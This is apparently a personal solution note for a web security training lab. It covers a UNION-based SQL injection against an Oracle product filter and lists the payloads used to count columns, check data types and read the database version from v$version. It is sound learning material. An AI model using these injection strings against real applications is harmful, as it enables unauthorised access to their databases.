@@ -1,0 +1,29 @@
+ This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
+
+To solve the lab, display the database version string. 
+
+Hint:
+On Oracle databases, every SELECT statement must specify a table to select FROM. If your UNION SELECT attack does not query from a table, you will still need to include the FROM keyword followed by a valid table name.
+
+There is a built-in table on Oracle called dual which you can use for this purpose. For example: UNION SELECT 'abc' FROM dual
+
+For more information, see our SQL injection cheat sheet.
+
+End Goal:
+- display the database version string
+
+Analysis:
+---------
+
+1) Determine the number of columns 
+' order by 3-- => internal server error
+
+3-1 = 2
+
+2) Determine the data types of the columns
+
+' UNION SELECT 'a', 'a' from DUAL-- => Orcale Database
+
+3) Output the version if the database
+
+' UNION SELECT banner, NULL from v$version--
